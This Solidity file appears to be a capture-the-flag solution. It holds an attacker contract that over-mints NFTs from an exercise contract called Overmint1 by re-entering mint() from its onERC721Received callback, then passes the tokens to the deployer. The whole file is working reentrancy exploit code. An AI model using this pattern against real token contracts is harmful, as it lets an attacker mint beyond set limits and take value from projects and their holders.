// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint1.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 public target;
    uint256 public receivedNFTs;
    address public attacker;
    mapping(uint256 => uint256) public tokenIds; // Track the received token IDs

    constructor(address _target) {
        target = Overmint1(_target);
        attacker = msg.sender; // Set the attacker's address
    }

    function attack() public {
        target.mint();
        transferNFTsToAttacker();
    }

    function transferNFTsToAttacker() public {
        for (uint256 i = 1; i <= receivedNFTs; i++) {
            uint256 tokenId = tokenIds[i];
            target.safeTransferFrom(address(this), attacker, tokenId);
        }
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external override returns (bytes4) {
        receivedNFTs++;
        tokenIds[receivedNFTs] = tokenId; // Store the token ID

        if (target.success(address(this)) == false) {
            target.mint();
        }
        return this.onERC721Received.selector;
    }
}
